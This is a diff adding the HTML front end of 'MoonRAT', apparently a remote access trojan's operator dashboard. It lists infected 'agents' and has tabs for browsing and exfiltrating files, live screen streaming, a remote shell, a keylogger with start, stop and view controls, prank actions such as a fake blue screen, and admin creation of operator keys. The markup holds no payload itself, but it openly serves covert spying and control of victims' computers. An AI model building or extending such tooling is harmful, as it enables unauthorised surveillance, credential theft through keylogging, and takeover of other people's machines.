@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#070709">
+<title>MoonRAT</title>
+<link rel="stylesheet" href="/static/css/tokens.css">
+<link rel="stylesheet" href="/static/css/themes.css">
+<link rel="stylesheet" href="/static/css/base.css">
+<link rel="stylesheet" href="/static/css/components.css">
+<link rel="stylesheet" href="/static/css/views.css">
+</head>
+<body>
+<header class="masthead">
+  <span class="brand">MOONRAT</span>
+  <span id="status" class="dim">connecting…</span>
+  <span class="spacer"></span>
+  <button type="button" class="action mini" id="btn-theme">theme: nord</button>
+  <button type="button" class="action mini" id="btn-logout">logout</button>
+</header>
+
+<main class="shell">
+  <aside id="agents" class="rail"></aside>
+
+  <section class="workarea">
+    <nav class="tabs">
+      <button type="button" data-tab="files" class="on">files</button>
+      <button type="button" data-tab="screen">screen</button>
+      <button type="button" data-tab="shell">shell</button>
+      <button type="button" data-tab="console">console</button>
+      <button type="button" data-tab="fun">fun</button>
+      <button type="button" data-tab="keys">keys</button>
+      <button type="button" data-tab="access" class="admin-only">access</button>
+    </nav>
+
+    <div class="panel on" id="tab-files">
+      <div class="toolbar">
+        <button type="button" class="action" id="btn-root">root</button>
+        <button type="button" class="action" id="btn-up">up</button>
+        <input id="path" class="field" spellcheck="false">
+        <button type="button" class="action" id="btn-go">go</button>
+        <button type="button" class="action" id="btn-reload">reload</button>
+        <button type="button" class="action" id="btn-upload">upload</button>
+        <button type="button" class="action" id="btn-zip">zip</button>
+        <input type="file" id="file" multiple hidden>
+      </div>
+      <div class="notice error" id="files-err"></div>
+      <div class="notice" id="files-info"></div>
+      <table class="listing"><tbody id="files"></tbody></table>
+    </div>
+
+    <div class="panel" id="tab-screen">
+      <div class="toolbar">
+        <label class="toggle dim"><input type="checkbox" id="live" checked> live</label>
+        <select id="quality" class="field">
+          <option value="low">low</option>
+          <option value="med" selected>med</option>
+          <option value="high">high</option>
+        </select>
+        <button type="button" class="action" id="btn-snap">snap</button>
+        <button type="button" class="action" id="btn-full">fullscreen</button>
+        <span class="live-dot"></span>
+        <span class="dim" id="shot-info"></span>
+      </div>
+      <div class="screen-frame"><img id="stream" alt=""></div>
+    </div>
+
+    <div class="panel" id="tab-shell">
+      <div class="toolbar">
+        <span class="prompt dim">$</span>
+        <input id="cmd" class="field" spellcheck="false" placeholder="command…">
+        <button type="button" class="action" id="btn-run">run</button>
+        <button type="button" class="action" id="btn-clear">clear</button>
+      </div>
+      <pre id="out" class="terminal"></pre>
+    </div>
+
+    <div class="panel" id="tab-console">
+      <div class="toolbar">
+        <span class="dim" id="game-info">detecting…</span>
+        <span class="spacer"></span>
+        <button type="button" class="action" id="btn-game-refresh">refresh</button>
+      </div>
+      <pre id="game-log" class="terminal"></pre>
+      <div class="toolbar">
+        <input id="game-cmd" class="field" spellcheck="false" placeholder="console command… (op, say, whitelist, stop…)">
+        <button type="button" class="action" id="btn-game-send">send</button>
+      </div>
+    </div>
+
+    <div class="panel" id="tab-fun">
+      <div class="fun-grid">
+        <div class="fun-card">
+          <span class="label">bsod</span>
+          <input id="bsod-sec" class="field narrow" value="15" spellcheck="false">
+          <span class="dim">sec</span>
+          <span class="spacer"></span>
+          <button type="button" class="action danger" id="btn-bsod">launch</button>
+        </div>
+        <div class="fun-card">
+          <span class="label">sound</span>
+          <select id="sound-kind" class="field">
+            <option value="error">error</option>
+            <option value="tada">tada</option>
+            <option value="troll">troll</option>
+            <option value="alarm">alarm</option>
+            <option value="beep">beep</option>
+            <option value="speak">speak</option>
+          </select>
+          <input id="sound-text" class="field" placeholder="text to speak…" spellcheck="false">
+          <button type="button" class="action" id="btn-sound">play</button>
+        </div>
+        <div class="fun-card">
+          <span class="label">notify</span>
+          <input id="ntf-title" class="field" value="MoonRAT" spellcheck="false">
+          <input id="ntf-body" class="field" placeholder="message…" spellcheck="false">
+          <button type="button" class="action" id="btn-notify">send</button>
+        </div>
+      </div>
+      <div class="notice error" id="fun-err"></div>
+    </div>
+
+    <div class="panel" id="tab-keys">
+      <div class="toolbar">
+        <button type="button" class="action" id="btn-kl-start">start</button>
+        <button type="button" class="action" id="btn-kl-stop">stop</button>
+        <button type="button" class="action" id="btn-kl-clear">clear</button>
+        <button type="button" class="action" id="btn-kl-refresh">refresh</button>
+        <span class="dim" id="keys-info"></span>
+      </div>
+      <pre id="keys" class="terminal"></pre>
+    </div>
+
+    <div class="panel admin-only" id="tab-access">
+      <div class="fun-grid">
+        <div class="fun-card">
+          <span class="label">new key</span>
+          <input id="access-label" class="field" placeholder="label…" spellcheck="false">
+          <select id="access-role" class="field">
+            <option value="operator" selected>operator</option>
+            <option value="admin">admin</option>
+          </select>
+          <button type="button" class="action" id="btn-access-add">create</button>
+        </div>
+        <div class="notice" id="access-notice"></div>
+        <div id="access-list" class="fun-grid"></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<script type="module" src="/static/js/app.js"></script>
+</body>
+</html>
